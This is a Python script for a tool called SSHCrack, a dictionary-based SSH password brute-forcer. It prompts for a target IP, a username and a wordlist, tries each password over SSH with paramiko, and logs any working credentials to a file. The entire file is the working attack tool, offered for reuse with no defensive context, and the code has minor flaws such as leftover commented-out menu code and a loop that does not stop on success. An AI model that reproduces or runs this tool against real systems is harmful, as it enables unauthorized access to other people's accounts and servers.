# Tool made by ChrisCode333. Feel free to modify and play with the code!
# Ensure you check the READ.ME for more information!
try:
	import paramiko, sys, socket, time, threading, time
	import os.path
	from datetime import datetime

except:
	print ("[-] Please install 'paramiko' module and try again.")

print ("""
	.d8888. .d8888. db   db  .o88b. d8888b.  .d8b.   .o88b. db   dD 
	88'  YP 88'  YP 88   88 d8P  Y8 88  `8D d8' `8b d8P  Y8 88 ,8P' 
	`8bo.   `8bo.   88ooo88 8P      88oobY' 88ooo88 8P      88,8P   
	  `Y8b.   `Y8b. 88~~~88 8b      88`8b   88~~~88 8b      88`8b   
	db   8D db   8D 88   88 Y8b  d8 88 `88. 88   88 Y8b  d8 88 `88. 
	`8888Y' `8888Y' YP   YP  `Y88P' 88   YD YP   YP  `Y88P' YP   YD 
	---------------------------------------------------------------
	""")

def keyInterrupt():
	print ("\n[-] User requsted an interrupt...shutting down.")
	time.sleep(1)
	sys.exit()

#print ('1) Use user:pass formatted dictionary file')
#print ('2) Use a password list and provide a username')

#def question1():
#	try:
#		selection = raw_input('>')
#		if selection == '1':
#			print 'working on it'
#		elif selection == '2':
#			pass
#		else:
#			print '[-] Invalid input!'
#	except KeyboardInterrupt():
#		keyInterrupt()
#question1()

try:
		host = raw_input("[*] Target IP: ")
		dictionary = raw_input("[*] Dictionary file: ")
		if os.path.isfile(dictionary):
			pass
		
		else:
			print ("[-] File path does not exist!")
			sys.exit()
		
		userName = raw_input("[*] Username: ")
		textFile = raw_input("[*] File to write results to (none for sshresults.txt): ")
		if textFile == '':
			textFile = 'sshresults.txt'

		start_time = datetime.now()
		print "\n[*] Cracking started at %s...\n" % (time.strftime("%H:%M:%S"))

except KeyboardInterrupt:
		keyInterrupt()

def attack(host, dictionary):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    p = open(dictionary,'r')
    for line in p.readlines():
        passWord = str(line.strip())
        print "[*] Trying " + userName +":" + passWord
        try:
            ssh.connect(host,username=userName,password=passWord)
            print '\n[+] Attack successful!'
            print '[+] Credentials: %s:%s' % (userName, passWord)
            print '[+] Cracking data logged to file %s!' % (textFile)
            global start_time
            stop_time = datetime.now()
            total_time_duration = stop_time - start_time
            ssh.close()
            write1 = 'SSH Cracking results for %s' % (host)
            write0 = '\n--------------------------------------'
            write2 = '\n[+] Username: %s' % (userName)
            write3 = '\n[+] Password: %s' % (passWord)
            write4 = '\n[+] Elapsed time: %s' % (total_time_duration)
            f= open(textFile,"w+")
            f.write (write1)
            f.write (write0)
            f.write (write2)
            f.write (write3)
            f.write (write4)
       
        except paramiko.AuthenticationException:
        	pass

attack(host, dictionary)
print "\n[*] Attack complete at %s" % (time.strftime("%H:%M:%S"))
sys.exit()
